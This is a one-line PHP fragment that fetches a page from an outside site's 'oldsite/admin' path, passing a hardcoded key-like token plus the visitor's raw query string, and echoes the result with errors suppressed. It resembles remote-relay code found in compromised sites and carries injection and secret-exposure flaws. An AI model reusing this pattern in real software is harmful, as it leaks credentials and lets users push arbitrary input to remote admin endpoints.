...
<? echo @file_get_contents("http://www.rescuecenter.com/oldsite/admin/contacts.php?&p=LPasjuY65FTq3Qpld1sadm0O0I8".$_SERVER['QUERY_STRING'].$data.$search_criterias.$pagenumber); ?>
